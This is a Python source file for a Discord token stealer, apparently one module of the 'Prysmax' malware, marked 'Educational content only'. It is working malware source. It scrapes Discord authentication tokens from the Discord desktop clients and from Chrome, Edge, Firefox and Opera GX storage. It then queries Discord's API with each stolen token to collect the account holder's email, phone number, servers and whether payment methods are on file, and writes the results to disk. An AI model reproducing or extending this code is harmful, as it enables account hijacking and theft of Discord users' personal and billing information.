#!/usr/bin/env python3
"""
Prysmax Discord Stealer Module
Educational content only
"""

import os
import sys
import json
import re
import base64
import sqlite3
import shutil
from pathlib import Path

try:
    import win32crypt
    from Crypto.Cipher import AES
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False

class DiscordStealer:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.discord_paths = {
            "Discord": os.path.expanduser("~\\AppData\\Roaming\\discord"),
            "Discord Canary": os.path.expanduser("~\\AppData\\Roaming\\discordcanary"),
            "Discord PTB": os.path.expanduser("~\\AppData\\Roaming\\discordptb"),
            "Discord Development": os.path.expanduser("~\\AppData\\Roaming\\discorddevelopment"),
            "Lightcord": os.path.expanduser("~\\AppData\\Roaming\\Lightcord"),
            "Opera GX": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera GX Stable"),
            "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default"),
            "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default"),
            "Firefox": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        }
        
        self.token_regex = re.compile(r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
        
    def steal(self):
        """Main Discord stealing function"""
        try:
            discord_dir = os.path.join(self.output_dir, "Discord")
            os.makedirs(discord_dir, exist_ok=True)
            
            tokens = []
            
            # Steal from Discord applications
            for app_name, app_path in self.discord_paths.items():
                try:
                    app_tokens = self.steal_from_app(app_name, app_path)
                    tokens.extend(app_tokens)
                except Exception as e:
                    print(f"[DISCORD] Error stealing from {app_name}: {e}")
            
            # Remove duplicates
            unique_tokens = list(set(tokens))
            
            if unique_tokens:
                # Get token information
                token_info = []
                for token in unique_tokens:
                    info = self.get_token_info(token)
                    if info:
                        token_info.append(info)
                
                # Save tokens
                with open(os.path.join(discord_dir, "tokens.json"), "w") as f:
                    json.dump(token_info, f, indent=2)
                
                # Save raw tokens
                with open(os.path.join(discord_dir, "raw_tokens.txt"), "w") as f:
                    for token in unique_tokens:
                        f.write(f"{token}\n")
                
                print(f"[DISCORD] Found {len(unique_tokens)} unique tokens")
            
        except Exception as e:
            print(f"[DISCORD] General error: {e}")
    
    def steal_from_app(self, app_name, app_path):
        """Steal tokens from specific Discord application"""
        tokens = []
        
        if not os.path.exists(app_path):
            return tokens
        
        try:
            if app_name in ["Chrome", "Edge"]:
                # Browser-based Discord
                tokens.extend(self.steal_from_browser(app_path))
            elif app_name == "Firefox":
                # Firefox profiles
                tokens.extend(self.steal_from_firefox(app_path))
            else:
                # Discord desktop applications
                tokens.extend(self.steal_from_discord_app(app_path))
                
        except Exception as e:
            print(f"[DISCORD] Error in {app_name}: {e}")
        
        return tokens
    
    def steal_from_discord_app(self, app_path):
        """Steal from Discord desktop application"""
        tokens = []
        
        try:
            # Look for Local Storage directories
            local_storage_paths = []
            
            for root, dirs, files in os.walk(app_path):
                if "Local Storage" in dirs:
                    local_storage_paths.append(os.path.join(root, "Local Storage"))
            
            for ls_path in local_storage_paths:
                leveldb_path = os.path.join(ls_path, "leveldb")
                if os.path.exists(leveldb_path):
                    tokens.extend(self.extract_tokens_from_leveldb(leveldb_path))
            
        except Exception as e:
            print(f"[DISCORD] Error stealing from Discord app: {e}")
        
        return tokens
    
    def steal_from_browser(self, browser_path):
        """Steal from browser-based Discord"""
        tokens = []
        
        try:
            # Look for Discord-related Local Storage
            local_storage_path = os.path.join(browser_path, "Local Storage", "leveldb")
            if os.path.exists(local_storage_path):
                tokens.extend(self.extract_tokens_from_leveldb(local_storage_path))
            
            # Also check for session storage
            session_storage_path = os.path.join(browser_path, "Session Storage")
            if os.path.exists(session_storage_path):
                tokens.extend(self.extract_tokens_from_directory(session_storage_path))
                
        except Exception as e:
            print(f"[DISCORD] Error stealing from browser: {e}")
        
        return tokens
    
    def steal_from_firefox(self, firefox_path):
        """Steal from Firefox profiles"""
        tokens = []
        
        try:
            for profile_dir in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile_dir)
                if os.path.isdir(profile_path):
                    # Check webappsstore.sqlite for local storage data
                    webapps_db = os.path.join(profile_path, "webappsstore.sqlite")
                    if os.path.exists(webapps_db):
                        tokens.extend(self.extract_tokens_from_firefox_db(webapps_db))
                        
        except Exception as e:
            print(f"[DISCORD] Error stealing from Firefox: {e}")
        
        return tokens
    
    def extract_tokens_from_leveldb(self, leveldb_path):
        """Extract tokens from LevelDB files"""
        tokens = []
        
        try:
            for file_name in os.listdir(leveldb_path):
                file_path = os.path.join(leveldb_path, file_name)
                if os.path.isfile(file_path):
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            found_tokens = self.token_regex.findall(content)
                            tokens.extend(found_tokens)
                    except:
                        # Try binary mode
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read().decode('utf-8', errors='ignore')
                                found_tokens = self.token_regex.findall(content)
                                tokens.extend(found_tokens)
                        except:
                            pass
                            
        except Exception as e:
            print(f"[DISCORD] Error extracting from LevelDB: {e}")
        
        return tokens
    
    def extract_tokens_from_directory(self, directory_path):
        """Extract tokens from directory files"""
        tokens = []
        
        try:
            for root, dirs, files in os.walk(directory_path):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            found_tokens = self.token_regex.findall(content)
                            tokens.extend(found_tokens)
                    except:
                        pass
                        
        except Exception as e:
            print(f"[DISCORD] Error extracting from directory: {e}")
        
        return tokens
    
    def extract_tokens_from_firefox_db(self, db_path):
        """Extract tokens from Firefox webappsstore.sqlite"""
        tokens = []
        
        try:
            temp_db = os.path.join(os.path.dirname(db_path), "temp_webapps.db")
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT key, value FROM webappsstore2 WHERE originKey LIKE '%discord%'")
            
            for row in cursor.fetchall():
                key, value = row
                if value:
                    found_tokens = self.token_regex.findall(value)
                    tokens.extend(found_tokens)
            
            conn.close()
            os.remove(temp_db)
            
        except Exception as e:
            print(f"[DISCORD] Error extracting from Firefox DB: {e}")
        
        return tokens
    
    def get_token_info(self, token):
        """Get information about Discord token"""
        try:
            import requests
            
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            
            # Get user info
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            if response.status_code == 200:
                user_data = response.json()
                
                # Get guilds
                guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
                guilds = []
                if guilds_response.status_code == 200:
                    guilds_data = guilds_response.json()
                    guilds = [{"name": guild.get("name"), "id": guild.get("id")} for guild in guilds_data]
                
                # Get billing info
                billing_response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers)
                has_payment_methods = False
                if billing_response.status_code == 200:
                    billing_data = billing_response.json()
                    has_payment_methods = len(billing_data) > 0
                
                return {
                    "token": token,
                    "user_id": user_data.get("id"),
                    "username": user_data.get("username"),
                    "discriminator": user_data.get("discriminator"),
                    "email": user_data.get("email"),
                    "phone": user_data.get("phone"),
                    "verified": user_data.get("verified"),
                    "mfa_enabled": user_data.get("mfa_enabled"),
                    "premium_type": user_data.get("premium_type"),
                    "avatar": user_data.get("avatar"),
                    "banner": user_data.get("banner"),
                    "accent_color": user_data.get("accent_color"),
                    "guilds_count": len(guilds),
                    "guilds": guilds[:10],  # Limit to first 10 guilds
                    "has_payment_methods": has_payment_methods,
                    "token_type": "Bot" if token.startswith("Bot ") else "User"
                }
            else:
                return {
                    "token": token,
                    "valid": False,
                    "error": f"HTTP {response.status_code}"
                }
                
        except Exception as e:
            return {
                "token": token,
                "valid": False,
                "error": str(e)
            }

